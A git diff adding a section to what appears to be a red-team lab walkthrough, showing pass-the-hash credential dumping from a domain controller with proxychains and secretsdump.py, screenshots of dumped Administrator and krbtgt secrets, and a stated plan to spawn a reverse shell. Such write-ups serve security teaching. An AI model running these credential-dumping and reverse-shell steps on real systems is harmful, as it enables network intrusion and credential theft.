@@ -396,3 +396,47 @@ net user /domain
 Enumerating more further on the machine, I can see more domain users.
 
 ![Screenshot 2023-07-08 at 8 59 30 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/a30ecf73-6965-4f22-a78f-4f7effbccf33)
+
+# Moving to DC
+
+## secretsdump.py
+
+To look more information on my target domain controller, I will use the secretsdump.py to extract **credentials and secrets from a system.**
+
+```bash
+proxychains secretsdump.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
+```
+
+![Screenshot 2023-07-08 at 8.23.21 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a21023a2-b284-4c78-b4e2-83caaace996a/Screenshot_2023-07-08_at_8.23.21_PM.png)
+
+Great, I got the Administrator credential and other more machine part of this domain.
+
+Also I got the krbtgt credentials as well.
+
+![Screenshot 2023-07-08 at 8.28.08 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/494a1532-bf87-4dc3-9fca-4321a47baaa8/Screenshot_2023-07-08_at_8.28.08_PM.png)
+
+## secretsdump.py -debug
+
+Even more information I gathered using the -debug switch
+
+```bash
+proxychains secretsdump.py -debug child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
+```
+
+![Screenshot 2023-07-08 at 8.33.03 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ac9373c4-a579-4fa7-b974-fa1fdbcd2dc2/Screenshot_2023-07-08_at_8.33.03_PM.png)
+
+![Screenshot 2023-07-08 at 8.33.23 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f238521b-4f01-4400-ac71-f6f0527d68dc/Screenshot_2023-07-08_at_8.33.23_PM.png)
+
+![Screenshot 2023-07-08 at 8.33.46 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bd1a1ca0-d589-4e49-96c3-f3a08a61a7f5/Screenshot_2023-07-08_at_8.33.46_PM.png)
+
+![Screenshot 2023-07-08 at 8.34.51 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1094db34-5b01-4916-b29f-20ef5f8c3559/Screenshot_2023-07-08_at_8.34.51_PM.png)
+
+![Screenshot 2023-07-08 at 8.35.44 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dba01eaa-2f84-4e79-aeba-a517975a8f78/Screenshot_2023-07-08_at_8.35.44_PM.png)
+
+![Screenshot 2023-07-08 at 8.36.17 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a07c7e2c-547d-4d6a-8f5f-fb9dc022b9d6/Screenshot_2023-07-08_at_8.36.17_PM.png)
+
+![Screenshot 2023-07-08 at 8.37.06 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4d0c3fd-7cf5-4690-b5c9-36deed4492e3/Screenshot_2023-07-08_at_8.37.06_PM.png)
+
+![Screenshot 2023-07-08 at 8.37.52 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fad8edf1-1742-4a6c-8593-673c5d87ffef/Screenshot_2023-07-08_at_8.37.52_PM.png)
+
+Moving further to our enumeration, I will use the windows/shell_reverse_tcp and incognito.exe to spawn a reverse shell from our attacking machine.
